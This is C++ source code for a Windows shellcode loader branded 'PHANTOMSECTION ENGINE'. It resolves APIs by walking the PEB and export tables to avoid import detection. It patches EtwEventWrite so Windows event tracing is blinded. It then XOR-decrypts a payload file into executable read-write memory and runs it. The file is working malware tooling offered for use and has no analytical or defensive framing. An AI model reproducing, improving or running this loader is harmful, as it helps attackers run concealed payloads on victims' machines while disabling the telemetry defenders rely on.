#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include <vector>

//PEB WALK STRUCTS
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      ModuleBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, * PMY_LDR_DATA_TABLE_ENTRY;

//MANUAL RESOLVER FUNCTIONS
PVOID GetModuleBase(LPWSTR moduleName) {
    PPEB pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurrent = pHead->Flink;
    while (pCurrent != pHead) {
        PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrent, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->BaseDllName.Buffer != NULL) {
            if (_wcsicmp(pEntry->BaseDllName.Buffer, moduleName) == 0) return pEntry->ModuleBase;
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

PVOID GetFunctionAddress(PVOID moduleBase, LPCSTR functionName) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExportDir->AddressOfNames);
    PDWORD pFunctions = (PDWORD)((PBYTE)moduleBase + pExportDir->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)((PBYTE)moduleBase + pExportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR currentName = (LPCSTR)((PBYTE)moduleBase + pNames[i]);
        if (strcmp(currentName, functionName) == 0) {
            DWORD funcRVA = pFunctions[pOrdinals[i]];
            return (PVOID)((PBYTE)moduleBase + funcRVA);
        }
    }
    return NULL;
}

int main() {
    std::cout << "[*] === PHANTOMSECTION ENGINE STARTING ===" << std::endl;

    // Manually find Kernel32 and ntdll
    PVOID kernel32Base = GetModuleBase((LPWSTR)L"KERNEL32.DLL");
    PVOID ntdllBase = GetModuleBase((LPWSTR)L"ntdll.dll");
    std::cout << "[+] Resolved Kernel32 and Ntdll via PEB Walk." << std::endl;

    //Manually resolve VirtualProtect and VirtualAlloc
    typedef BOOL(WINAPI* fnVirtualProtect)(PVOID, SIZE_T, DWORD, PDWORD);
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetFunctionAddress(kernel32Base, "VirtualProtect");

    typedef PVOID(WINAPI* fnVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetFunctionAddress(kernel32Base, "VirtualAlloc");
    std::cout << "[+] Resolved functions via Export Address Table." << std::endl;

    //ETW PATCHING 
    PVOID etwEventWriteAddr = GetFunctionAddress(ntdllBase, "EtwEventWrite");
    DWORD oldProtect = 0;
    pVirtualProtect(etwEventWriteAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
    memcpy(etwEventWriteAddr, patch, sizeof(patch));
    pVirtualProtect(etwEventWriteAddr, 1, oldProtect, &oldProtect);
    std::cout << "[+] Patched EtwEventWrite (ETW Blinded)." << std::endl;

    // READ ENCRYPTED PAYLOAD FROM FILE 
    std::ifstream file("payload.bin", std::ios::binary);
    if (!file) {
        std::cout << "[-] Failed to open payload.bin! Make sure it is in the same folder as the .exe" << std::endl;
        return 1;
    }
    std::vector<char> enc_payload((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    std::cout << "[+] Read " << enc_payload.size() << " bytes from payload.bin" << std::endl;

    // Allocate RWX memory manually
    void* exec_memory = pVirtualAlloc(NULL, enc_payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] Allocated RWX memory at: " << exec_memory << std::endl;

    // Decrypt the payload in memory using XOR key 0x55
    for (unsigned int i = 0; i < enc_payload.size(); i++) {
        enc_payload[i] ^= 0x55;
    }
    std::cout << "[+] Payload decrypted in memory." << std::endl;

    // Copy and execute
    memcpy(exec_memory, enc_payload.data(), enc_payload.size());
    std::cout << "[+] Shellcode written. Executing payload..." << std::endl;
    ((void(*)())exec_memory)();

    return 0;
}
